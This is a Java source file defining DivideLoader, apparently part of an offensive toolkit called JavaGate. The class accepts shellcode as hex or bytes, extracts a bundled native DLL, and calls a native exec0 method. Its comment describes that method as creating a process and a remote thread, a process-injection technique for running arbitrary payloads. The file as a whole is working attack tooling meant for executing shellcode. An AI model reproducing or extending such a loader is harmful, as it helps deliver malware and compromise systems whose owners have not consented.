package me.n1ar4.gate.loader;

import me.n1ar4.gate.core.JavaGate;
import me.n1ar4.gate.util.JNIUtil;

/**
 * Create Process and Create Remote Thread
 */
@SuppressWarnings("unused")
public class DivideLoader extends JavaGate {
    public DivideLoader(String shellCodeHex) {
        super(shellCodeHex);
        JNIUtil.extractDll(JAVA_LOADER);
    }

    public DivideLoader(byte[] shellCode) {
        super(shellCode);
        JNIUtil.extractDll(JAVA_LOADER);
    }

    @Override
    public void execAndWait() throws RuntimeException {
        super.execAndWait();
        exec0(this.shellCode, this.shellCode.length, false);
        super.waitInMain();
    }

    @Override
    public void execNoWait() throws RuntimeException {
        super.execNoWait();
        new Thread(() -> exec0(shellCode, shellCode.length, false)).start();
    }

    @Override
    public void debugAndWait() throws RuntimeException {
        super.debugAndWait();
        exec0(this.shellCode, this.shellCode.length, true);
        super.waitInMain();
    }

    @Override
    public void exec() throws RuntimeException {
        this.execAndWait();
    }

    private native void exec0(byte[] shellcode, int size, boolean debug);
}
